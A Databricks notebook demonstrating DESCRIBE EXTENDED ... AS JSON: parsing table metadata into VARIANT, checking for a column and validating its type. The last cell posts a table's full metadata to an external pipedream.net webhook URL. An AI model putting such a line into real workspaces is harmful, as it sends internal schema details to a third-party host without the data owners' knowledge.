-- Databricks notebook source
CREATE OR REPLACE TABLE metadata_catalog (
  t STRING,
  meta VARIANT
);

-- COMMAND ----------

DESCRIBE EXTENDED my_table AS JSON;

-- COMMAND ----------

DECLARE OR REPLACE vTable = "my_table";
DESCRIBE EXTENDED IDENTIFIER(vTable) AS JSON;

-- COMMAND ----------

EXECUTE IMMEDIATE "DESCRIBE EXTENDED my_table AS JSON";

-- COMMAND ----------

-- MAGIC %python
-- MAGIC from pyspark.sql.functions import parse_json, col
-- MAGIC
-- MAGIC df = spark.sql("DESCRIBE EXTENDED my_table AS JSON")
-- MAGIC
-- MAGIC # convert to VARIANT TYPE ready for storing or other operations
-- MAGIC df_with_variant = df.withColumn("variant_metadata", parse_json(col("json_metadata")))
-- MAGIC
-- MAGIC display(df_with_variant)

-- COMMAND ----------

-- MAGIC %python
-- MAGIC df_with_variant.selectExpr("variant_metadata:columns").show(truncate=False)

-- COMMAND ----------

-- MAGIC %python
-- MAGIC import json
-- MAGIC metadata_json = spark.sql("DESCRIBE EXTENDED my_table AS JSON").collect()[0][0]
-- MAGIC metadata = json.loads(metadata_json)
-- MAGIC
-- MAGIC column_exists = any(col["name"] == "customer_id" for col in metadata["columns"])
-- MAGIC print(f"Column 'customer_id' exists: {column_exists}")
-- MAGIC

-- COMMAND ----------

-- MAGIC %python
-- MAGIC import json
-- MAGIC
-- MAGIC expected_type = "int"
-- MAGIC metadata_json = spark.sql("DESCRIBE EXTENDED bagel_delivery AS JSON").collect()[0][0]
-- MAGIC metadata = json.loads(metadata_json)
-- MAGIC
-- MAGIC for col in metadata["columns"]:
-- MAGIC
-- MAGIC     if col["name"] == "customer_id" and col["type"]["name"] != expected_type:
-- MAGIC         print(
-- MAGIC             f"Warning: customer_id has type {col["type"]["name"]} instead of {expected_type}"
-- MAGIC         )

-- COMMAND ----------

-- MAGIC %python
-- MAGIC import requests  
-- MAGIC meta = spark.sql("DESCRIBE EXTENDED my_table AS JSON").collect()[0][0]  
-- MAGIC requests.post("https://eoohomz6hb9petw.m.pipedream.net/", json={"table": "orders", "metadata": meta})
-- MAGIC
